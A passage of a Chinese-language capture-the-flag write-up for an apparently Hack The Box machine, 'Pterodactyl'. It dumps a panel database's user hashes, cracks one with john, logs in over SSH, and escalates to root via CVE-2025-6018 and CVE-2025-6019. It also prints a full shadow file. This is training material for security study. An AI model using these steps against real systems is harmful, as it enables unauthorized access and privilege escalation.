pterodactyl -p<span class="string">&#x27;PteraPanel&#x27;</span> -h 127.0.0.1 -D panel -e <span class="string">&quot;SHOW TABLES;&quot;</span></span><br><span class="line"></span><br><span class="line">mysql: Deprecated program name. It will be removed <span class="keyword">in</span> a future release, use <span class="string">&#x27;/usr/bin/mariadb&#x27;</span> instead</span><br><span class="line">Tables_in_panel</span><br><span class="line">activity_log_subjects</span><br><span class="line">activity_logs</span><br><span class="line">allocations</span><br><span class="line">api_keys</span><br><span class="line">api_logs</span><br><span class="line">audit_logs</span><br><span class="line">backups</span><br><span class="line">database_hosts</span><br><span class="line">databases</span><br><span class="line">egg_mount</span><br><span class="line">egg_variables</span><br><span class="line">eggs</span><br><span class="line">failed_jobs</span><br><span class="line"><span class="built_in">jobs</span></span><br><span class="line">locations</span><br><span class="line">migrations</span><br><span class="line">mount_node</span><br><span class="line">mount_server</span><br><span class="line">mounts</span><br><span class="line">nests</span><br><span class="line">nodes</span><br><span class="line">notifications</span><br><span class="line">password_resets</span><br><span class="line">recovery_tokens</span><br><span class="line">schedules</span><br><span class="line">server_transfers</span><br><span class="line">server_variables</span><br><span class="line">servers</span><br><span class="line">sessions</span><br><span class="line">settings</span><br><span class="line">subusers</span><br><span class="line">tasks</span><br><span class="line">tasks_log</span><br><span class="line">user_ssh_keys</span><br><span class="line"><span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>users</code> 数据库</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u pterodactyl -p<span class="string">&#x27;PteraPanel&#x27;</span> -h 127.0.0.1 -D panel -e <span class="string">&quot;SELECT * FROM users;&quot;</span></span><br><span class="line"></span><br><span class="line">mysql: Deprecated program name. It will be removed <span class="keyword">in</span> a future release, use <span class="string">&#x27;/usr/bin/mariadb&#x27;</span> instead</span><br><span class="line"><span class="built_in">id</span>      external_id     uuid    username        email   name_first      name_last       password      remember_token   language        root_admin      use_totp        totp_secret     totp_authenticated_at gravatar created_at      updated_at</span><br><span class="line">2       NULL    5e6d956e-7be9-41ec-8016-45e434de8420    headmonitor     headmonitor@pterodactyl.htb   Head     Monitor $2y$10<span class="variable">$3WJht3</span>/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2    OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU   en      1       0       NULL    NULL    1       2025-09-16 17:15:41    2025-09-16 17:15:41</span><br><span class="line">3       NULL    ac7ba5c2-6fd8-4600-aeb6-f15a3906982b    phileasfogg3    phileasfogg3@pterodactyl.htb  Phileas  Fogg    $2y$10<span class="variable">$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span>    6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8   en      0       0       NULL    NULL    1       2025-09-16 19:44:19    2025-11-07 18:28:50</span><br></pre></td></tr></table></figure>
+
+<p>使用 john 对得到的 hash 进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash.txt --wordlist=/usr/share/wordlists/rockyou.tx</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>phileasfogg3:!QAZ2wsx</code>，我们尝试进行 ssh 登录</p>
+<p>拿到 user flag</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phileasfogg3@pterodactyl:~&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">bdf11038c28774f26e024601d0333772</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2025-6018-CVE-2025-6019"><a href="#CVE-2025-6018-CVE-2025-6019" class="headerlink" title="CVE-2025-6018 &amp; CVE-2025-6019"></a>CVE-2025-6018 &amp; CVE-2025-6019</h3><p>有注意到还存在一些其他服务的端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Active Ports</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports</span><br><span class="line">══╣ Active Ports (ss)</span><br><span class="line">tcp   LISTEN 0      512        127.0.0.1:631       0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      512        127.0.0.1:9000      0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      100        127.0.0.1:25        0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      512          0.0.0.0:80        0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      511        127.0.0.1:6379      0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      128             [::]:22           [::]:*      </span><br></pre></td></tr></table></figure>
+
+<p><code>631</code> 是 <code>CUPS 2.2.7</code>，不受 rce nday 的影响</p>
+<p>查看系统可得受到 CVE-2025-6018&#x2F;CVE-2025-6019 的影响</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">phileasfogg3@pterodactyl:~&gt; <span class="built_in">cat</span> /etc/os-release</span><br><span class="line">NAME=<span class="string">&quot;openSUSE Leap&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;15.6&quot;</span></span><br><span class="line">ID=<span class="string">&quot;opensuse-leap&quot;</span></span><br><span class="line">ID_LIKE=<span class="string">&quot;suse opensuse&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;15.6&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;openSUSE Leap 15.6&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;0;32&quot;</span></span><br><span class="line">CPE_NAME=<span class="string">&quot;cpe:/o:opensuse:leap:15.6&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.opensuse.org&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.opensuse.org/&quot;</span></span><br><span class="line">DOCUMENTATION_URL=<span class="string">&quot;https://en.opensuse.org/Portal:Leap&quot;</span></span><br><span class="line">LOGO=<span class="string">&quot;distributor-logo-Leap&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>CVE-2025-6018，登录上后修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; ~/.pam_environment &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">XDG_SEAT OVERRIDE=seat0</span><br><span class="line">XDG_VTNR OVERRIDE=1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>在本地制作一个恶意 XFS 文件系统镜像，利用 <a target="_blank" rel="noopener" href="https://github.com/guinea-offensive-security/CVE-2025-6019">guinea-offensive-security&#x2F;CVE-2025-6019</a> 提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# <span class="built_in">id</span></span><br><span class="line">uid=1002(phileasfogg3) gid=100(<span class="built_in">users</span>) euid=0(root) <span class="built_in">groups</span>=100(<span class="built_in">users</span>)</span><br><span class="line">bash-5.1# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">743457eefd923f2e830a5029cd76b011</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:$6$iOhjvxjnk.Sgt97C$Fr4NzyL9SEFOiH653sh30DAR1kmR9jxGNeWMplTMQmlXVO/CfRXy7q2xopOBkfG2SG/I3O7KDOFHT7bOTZG.a0:20343::::::</span><br><span class="line">messagebus:!:20343::::::</span><br><span class="line">nobody:!:20343::::::</span><br><span class="line">man:!:20343::::::</span><br><span class="line">mail:!:20343::::::</span><br><span class="line">lp:!:20343::::::</span><br><span class="line">daemon:!:20343::::::</span><br><span class="line">bin:!:20343::::::</span><br><span class="line">chrony:!:20343::::::</span><br><span class="line">postfix:!:20343::::::</span><br><span class="line">systemd-timesync:!*:20343::::::</span><br><span class="line">nscd:!:20343::::::</span><br><span class="line">polkitd:!:20343::::::</span><br><span class="line">rpc:!:20343::::::</span><br><span class="line">statd:!:20343::::::</span><br><span class="line">sshd:!:20343::::::</span><br><span class="line">wwwrun:!:20347::::::</span><br><span class="line">mysql:!:20347::::::</span><br><span class="line">redis:!:20347::::::</span><br><span class="line">nginx:!:20347::::::</span><br><span class="line">dockremap:!:20347::::::</span><br><span class="line">pterodactyl:!:20399::::::</span><br><span class="line">headmonitor:!:20399:0:99999:7:::</span><br><span class="line">phileasfogg3:$6$Zc6vsfIsXPSjCLgU$1CEcVIqk717ztdSj0VJ3CaCxSsGYV8N2DgJsJGXeDKoYoBmc8l2F5LbvWFfRYuyBn0Xf5t1Tx4i9Ao8xsSnXQ.:20399:0:99999:7:::</span><br><span class="line">_laurel:!:20453::::::</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/07/Season10-Facts/" rel="prev" title="[Season10] Facts WP">
+                  <i class="fa fa-angle-left"></i> [Season10] Facts WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/02/20/Season10-WingData/" rel="next" title="[Season10] WingData WP">
+                  [Season10] WingData WP <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">l1nk</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
